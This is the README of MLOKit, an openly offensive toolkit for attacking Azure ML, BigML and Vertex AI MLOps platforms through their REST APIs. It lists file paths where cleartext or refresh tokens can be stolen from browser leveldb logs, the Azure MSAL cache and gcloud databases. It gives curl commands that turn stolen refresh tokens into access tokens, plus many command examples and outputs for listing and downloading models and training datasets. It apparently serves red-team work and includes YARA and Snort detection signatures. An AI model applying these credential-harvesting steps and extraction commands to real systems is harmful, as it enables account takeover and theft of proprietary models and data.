# MLOKit

## Description

MLOps Attack Toolkit - MLOKit is a toolkit that can be used to attack MLOps platforms by taking advantage of the available REST API. This tool allows the user to specify an attack module, along with specifying valid credentials (API key or stolen access token) for the respective MLOps platform. The attack modules supported include reconnaissance, data extraction and model extraction. MLOKit was built in a modular approach, so that new modules can be added in the future by the information security community.

Full details on the techniques used by MLOKit are in the X-Force Red [whitepaper](https://www.ibm.com/downloads/documents/us-en/11630e2cbc302316).


## Release
* Version 1.0 of MLOKit can be found in Releases

## Table of Contents

- [MLOKit](#MLOKit)
- [Table of Contents](#table-of-contents)
- [Installation/Building](#installationbuilding)
  - [Libraries Used](#libraries-used)
  - [Pre-Compiled](#pre-compiled)
  - [Building Yourself](#building-yourself)
- [Command Modules](#command-modules)
- [Arguments/Options](#argumentsoptions)
- [Authentication Options](#authentication-options)
- [Module Details Table](#module-details-table)
- [Examples](#examples)
  - [Check](#Check)
  - [List Projects/Workspaces](#List-ProjectsWorkspaces)
  - [List Models](#List-Models)
  - [List Datasets](#List-Datasets)
  - [Download Model](#download-model)
  - [Download Dataset](#download-dataset)
- [Detection](#detection)
- [References](#references)

## Installation/Building

### Libraries Used
The below 3rd party libraries are used in this project.

| Library | URL | License |
| ------------- | ------------- | ------------- |
| Fody  | [https://github.com/Fody/Fody](https://github.com/Fody/Fody) | MIT License  |
| Newtonsoft.Json  | [https://github.com/JamesNK/Newtonsoft.Json](https://github.com/JamesNK/Newtonsoft.Json) | MIT License  |

### Pre-Compiled 

* Use the pre-compiled binary in Releases

### Building Yourself

Take the below steps to setup Visual Studio in order to compile the project yourself. This requires two .NET libraries that can be installed from the NuGet package manager.

* Load the Visual Studio project up and go to "Tools" --> "NuGet Package Manager" --> "Package Manager Settings"
* Go to "NuGet Package Manager" --> "Package Sources"
* Add a package source with the URL `https://api.nuget.org/v3/index.json`
* Install the Costura.Fody NuGet package. 
  * `Install-Package Costura.Fody -Version 3.3.3`
* Install the Newtonsoft.Json package
  * `Install-Package Newtonsoft.Json`
* You can now build the project yourself!

## Command Modules

* **check** - Check whether credentials provided are valid
* **list-projects** - List the available projects
* **list-models** - List the available ML models
* **list-datasets** - List the available training datasets
* **download-model** - Download a given ML model
* **download-dataset** - Download a given training dataset



## Arguments/Options

### Globally Required Arguments

The below arguments are required for all command modules.

* **/credential:** - Credential for authentication (API key or Stolen Access Token). Applicable to all modules
* **/platform:** - MLOps Platform. Applicable to all modules. Supported MLOps platforms listed below.
  * `azureml`
  * `bigml`
  * `vertexai`

### Optional Arguments/Dependent on Platform and Module

* **/subscription-id:** - Applicable to `azureml` platform only. Only applies to some command modules.
* **/resource-group:** - Applicable to `azureml` platform only. Only applies to some command modules.
* **/workspace:** - Applicable to `azureml` platform only. Only applies to some command modules.
* **/region:** - Applicable to `azureml` platform only. Only applies to some command modules.
* **/project:** - Applicable to `vertexai` platform only. Only applies to some command modules.
* **/model-id:** - Applicable to all platforms. Only applies to some command modules.
* **/dataset-id:** - Applicable to all platforms. Only applies to some command modules.



## Authentication Options

Below are the authentication options you have with MLOKit when authenticating to a supported MLOps platform. You would provide this credential material in the `/credential:` argument.

### Access Token

#### Azure ML

There are multiple methods that can be used to obtain an access token for Azure ML. Once you have obtained an access token, you can use it to authenticate to Azure ML with MLOKit. Some of these methods will be highlighted below.

##### Azure CLI

If you have compromised user Entra ID credentials and can login via the Azure CLI, enter the below command to obtain an access token.

`az account get-access-token --subscription [SUBSCRIPTION_ID]`

##### Refresh Token on File System

On the file system there is a file located at `%USERPROFILE%\.azure\msal_http_cache.bin` that can contain a refresh token for an authenticated user. You can obtain all required information from this file, such as the client ID, refresh token, and tenant ID, and then run the below command to get an access token.

`curl --request POST --data "client_id=[CLIENT_ID]&refresh_token=[REFRESH_TOKEN]&grant_type=refresh_token" "https://login.microsoftonline.com/[TENANT_ID]/oauth2/v2.0/token"`

##### Access Token on File System

If a user has authenticated to Azure ML via a Chromium browser, such as Microsoft Edge or Google Chrome, there will be a log file at one of the below locations that contains an access token in cleartext. Within the log file, search for the key of `secret`, which can contain the access token value.

| Browser    | File Path |
| -------- | ------- |
| Chrome  | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb\*.log`    |
| Edge | `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Storage\leveldb\*.log`     |


#### Vertex AI

There are multiple methods that can be used to obtain an access token for Vertex AI. Once you have obtained an access token, you can use it to authenticate to Vertex AI with MLOKit. Some of these methods will be highlighted below.

##### Access Token SQLite Database

When a user authenticates with the Google Cloud CLI, an access token is obtained and logged in a SQLite database at the below file location. Within the SQLite database there will be information such as the account id, access token, and token expiry.

| Operating System    | File Path |
| -------- | ------- |
| Windows  | `%APPDATA%\gcloud\access_tokens.db`    |
| Linux | `~/.config/gcloud/access_tokens.db`     |

##### Google Cloud CLI

If you have compromised Google Cloud user credentials and can login via the Google Cloud CLI, enter the below command to obtain an access token.

`gcloud auth print-access-token`

If you are logging in via ADC as a user in the Google Cloud CLI, you would run the below command to get an access token.

`gcloud auth application-default print-access-token`

##### Refresh Token from Legacy Credentials

On the file system, there are files located at the below file locations that can contain a refresh token for an authenticated user. 

| Operating System    | File Path |
| -------- | ------- |
| Windows  | `%APPDATA%\gcloud\legacy_credentials\[USER]`    |
| Linux | `~/.config/gcloud/legacy_credentials/[USER]`     |

You can obtain all required information from this file, such as the client ID, client secret, and refresh token, and then run the below command to get an access token.

`curl --request POST --data "client_id=[CLIENT_ID]&client_secret=[CLIENT_SECRET]&refresh_token=[REFRESH_TOKEN]&grant_type=refresh_token" "https://accounts.google.com/o/oauth2/token"`


### API Key

#### BigML

API key is alphanumeric and is provided as a GET variable name of `api_key=`.

## Module Details Table

The below table shows where each module is supported

Module  | Azure ML (`azureml`) | BigML (`bigml`) | Vertex AI (`vertexai`)
:---: |:---: | :---: | :---: 
`check` | X | X | X
`list-projects` | X | X | X
`list-models` | X | X | X
`list-datasets` | X | X | X
`download-model` | X | X | X
`download-dataset` | X | X | X



## Examples

### Check

#### Use Case

> *Check whether the supplied credentials are valid to a given MLOps platform*

#### Syntax

Supply the `check` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument. The output of this command will inform you whether the credentials you provided are valid.

##### Azure ML

`MLOKit.exe check /platform:azureml /credential:eyJ...`

##### BigML

`MLOKit.exe check /platform:bigml /credential:username;apiKey`

##### Vertex AI

`MLOKit.exe check /platform:vertexai /credential:ya29..`

##### Example Output

```
C:\>MLOKit.exe check /platform:azureml /credential:eyJ0...

==================================================
Module:         check
Credential:     eyJ0e..
Platform:       azureml
Timestamp:      4/7/2024 2:09:59 PM
==================================================


[*] INFO: Performing check module for azureml


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.


[*] INFO: Listing subscriptions user has acess to

                                              Name |                          Subscription ID |               Status
--------------------------------------------------------------------------------------------------------------------
                               Some Subscription 1 |     aaaaaaaa-1111-1111-aaaa-aaaaaaaaaaaa |              Enabled
                               Some Subscription 2 |     bbbbbbbb-2222-2222-bbbb-bbbbbbbbbbbb |              Enabled
                               Some Subscription 3 |     cccccccc-3333-3333-cccc-cccccccccccc |             Disabled
                               Some Subscription 4 |     dddddddd-4444-4444-dddd-dddddddddddd |             Disabled

```

### List Projects/Workspaces

#### Use Case

> *List all AI/ML projects you have access to.*

#### Syntax

Supply the `list-projects` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument. The output of this command will list the AI/ML projects that you have access to.

##### Azure ML

For the `azureml` platform, you will also have to provide a subscription ID in the `/subscription-id:` command argument.

`MLOKit.exe list-projects /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID]`

##### BigML

`MLOKit.exe list-projects /platform:bigml /credential:username;apiKey`

##### Vertex AI

`MLOKit.exe list-projects /platform:vertexai /credential:ya29..`

##### Example Output

```
C:\>MLOKit.exe list-projects /platform:vertexai /credential:ya29...

==================================================
Module:         list-projects
Credential:     ya29.a...
Platform:       vertexai
Timestamp:      4/7/2024 2:14:55 PM
==================================================


[*] INFO: Performing list-projects module for vertexai


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

                          Name |                     Project ID |       Project Number | Project State |                  Creation Date
---------------------------------------------------------------------------------------------------------------------------------------
              My Project 98785 |            sigma-lyceum-419319 |         105931367384 |        ACTIVE |            4/4/2024 7:11:16 PM
              My First Project |            coral-marker-414313 |          67870862563 |        ACTIVE |           2/14/2024 1:58:57 PM

```

### List Models

#### Use Case

> *List all ML models that you have access to.*

#### Syntax

Supply the `list-models` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument. The output of this command will list the ML models that you have access to.

##### Azure ML

For the `azureml` platform, you will also have to provide a subscription ID in the `/subscription-id:` command argument. Additionally, you will need to provide a region, resource group and workspace to list models from in the `/region:`, `/resource-group:`, and `/workspace:` command arguments respectively.

`MLOKit.exe list-models /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME]`

##### BigML

`MLOKit.exe list-models /platform:bigml /credential:username;apiKey`

##### Vertex AI

For the `vertexai` platform, you will also have to provide a project in the `/project:` command argument.

`MLOKit.exe list-models /platform:vertexai /credential:ya29.. /project:[PROJECT_NAME]`

##### Example Output

```
C:\>MLOKit.exe list-models /platform:bigml /credential:username;apiKey

==================================================
Module:         list-models
Credential:     user;apiKey
Platform:       bigml
Timestamp:      4/7/2024 2:21:54 PM
==================================================


[*] INFO: Performing list-models module for bigml


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.

                                    Name | Visibility |           Created By |        Creation Date |          Update Date |                       Model ID |        Associated Project (ID) |        Associated Dataset (ID)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                               bank-full |    Private |        brett_hawkins |  4/3/2024 8:35:05 PM |  4/3/2024 8:35:10 PM |       660dbd79b47e654209bbb4c5 |       65ca4513a0a683376c351374 |       660dbc57ff7b592f2d19ec2d
        taxi-fare-train-UPDATED [merged] |    Private |        brett_hawkins | 2/12/2024 5:06:03 PM |  4/3/2024 8:35:10 PM |       65ca4ffbbd37cab02319ee58 |       65ca4513a0a683376c351374 |       65ca4f25dcb2364267a31612
```

### List Datasets

#### Use Case

> *List all training datasets that you have access to.*

#### Syntax

Supply the `list-datasets` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument. The output of this command will list the training datasets that you have access to.

##### Azure ML

For the `azureml` platform, you will also have to provide a subscription ID in the `/subscription-id:` command argument. Additionally, you will need to provide a region, resource group and workspace to list datasets from in the `/region:`, `/resource-group:`, and `/workspace:` command arguments respectively.

`MLOKit.exe list-datasets /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME]`

##### BigML

`MLOKit.exe list-datasets /platform:bigml /credential:username;apiKey`

##### Vertex AI

For the `vertexai` platform, you will also have to provide a project in the `/project:` command argument.

`MLOKit.exe list-datasets /platform:vertexai /credential:ya29.. /project:[PROJECT_NAME]`

##### Example Output

```
C:\>MLOKit.exe list-datasets /platform:vertexai /credential:ya29... /project:coral-marker-414313

==================================================
Module:         list-datasets
Credential:     ya29...
Platform:       vertexai
Timestamp:      4/7/2024 2:17:11 PM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.


[*] INFO: Listing regions for the coral-marker-414313 project

asia-east1
asia-northeast1
australia-southeast1
europe-west1
europe-west2
global
us-central1
us-east1
us-east4
us-west2
us-west3
us-west4
us-west4
                          Name |           Dataset ID |                  Creation Date |                    Update Date |          Region |                                                    File Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                bank-marketing |  4622581079147020288 |           2/14/2024 6:14:36 PM |          3/21/2024 12:47:35 PM |     us-central1 | gs://cloud-ai-platform-18195e29-682d-4d93-b7ee-e5c514f8eadd/dataset1-name.csv
            some-other-dataset |  5504207985204789248 |            4/5/2024 1:58:00 PM |            4/5/2024 1:59:23 PM |        us-east1 | gs://cloud-ai-platform-a8faba59-2fce-4cc5-a5bf-147742ac309d/someFolder/some-other-dataset-blah.csv

```

### Download Model

#### Use Case

> *Download a given ML model and its associated files and assets.*

#### Syntax

Supply the `download-model` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument and a model ID in the `/model-id:` command argument. The correlating model files will be downloaded to your current working directory.

##### Azure ML

For the `azureml` platform, you will also have to provide a subscription ID in the `/subscription-id:` command argument. Additionally, you will need to provide a region, resource group, workspace and model ID to download a model from in the `/region:`, `/resource-group:`, `/workspace:`, and `/model-id:` command arguments respectively.

`MLOKit.exe download-model /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME] /model-id:[MODEL_ID]`

##### BigML

`MLOKit.exe download-model /platform:bigml /credential:username;apiKey /model-id:[MODEL_ID]`

##### Vertex AI

For the `vertexai` platform, you will also have to provide a project in the `/project:` command argument.

`MLOKit.exe download-model /platform:vertexai /credential:ya29.. /project:[PROJECT_NAME] /model-id:[MODEL_ID]`

##### Example Output

```
C:\>MLOKit.exe download-model /platform:bigml /credential:username;apiKey /model-id:660dbd79b47e654209bbb4c5

==================================================
Module:         download-model
Credential:     username;apiKey
Platform:       bigml
Timestamp:      4/7/2024 2:23:02 PM
==================================================


[*] INFO: Performing download-model module for bigml


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.


[*] INFO: Downloading model in PMML format with ID 660dbd79b47e654209bbb4c5 to the current working directory of C:\Temp


[+] SUCCESS: Model written to: C:\Temp\MLOKit-mcqTmrDH.xml

```

### Download Dataset

#### Use Case

> *Download a given training dataset*

#### Syntax

Supply the `download-dataset` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument. The correlating dataset file will be downloaded to your current working directory.

##### Azure ML

For the `azureml` platform, you will also have to provide a subscription ID in the `/subscription-id:` command argument. Additionally, you will need to provide a region, resource group, workspace and dataset ID to download a dataset from in the `/region:`, `/resource-group:`, `/workspace:`, and `/dataset-id:` command arguments respectively.

`MLOKit.exe download-dataset /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME] /dataset-id:[DATASET_ID]`

##### BigML

For the `bigml` platform, you will also have to provide a dataset ID in the `/dataset-id:` command argument.

`MLOKit.exe download-dataset /platform:bigml /credential:username;apiKey /dataset-id:[DATASET_ID]`

##### Vertex AI

For the `vertexai` platform, you will also have to provide a project name in the `/project:` command argument and a dataset ID in the `/dataset-id:` command argument.

`MLOKit.exe download-dataset /platform:vertexai /credential:ya29.. /project:[PROJECT_NAME] /dataset-id:[DATASET_ID]`

##### Example Output

```
C:\>MLOKit.exe download-dataset /platform:vertexai /credential:ya29... /project:coral-marker-414313 /dataset-id:5504207985204789248

==================================================
Module:         download-dataset
Credential:     ya29...
Platform:       vertexai
Timestamp:      4/7/2024 2:19:23 PM
==================================================


[*] INFO: Checking credentials provided

[+] SUCCESS: Credentials provided are VALID.


[*] INFO: Getting all regions for the coral-marker-414313 project


[*] INFO: Getting mediaLink for gs://cloud-ai-platform-18195e29-682d-4d93-b7ee-e5c514f8eadd/dataset1-name.csv


[+] SUCCESS: Dataset written to: C:\Temp\MLOKit-nKBqOWLO

```


## Detection

Below are static signatures for the specific usage of this tool in its default state:

* Project GUID - `{32D508EE-ADFF-4553-A5E6-300E8DF64434}`
  * See [MLOKit Yara Rule](Detections/MLOKit.yar) in this repo.
* User Agent String - `MLOKit-e977ac02118a3cb2c584d92a324e41e9`
  * See [MLOKit Snort Rule](Detections/MLOKit.rules) in this repo.

For detection guidance of the techniques used by the tool, see the X-Force Red [whitepaper](https://www.ibm.com/downloads/documents/us-en/11630e2cbc302316).


## References
* https://learn.microsoft.com/en-us/rest/api/azureml/?view=rest-azureml-2023-10-01
* https://bigml.com/api/
* https://cloud.google.com/vertex-ai/docs/reference/rest
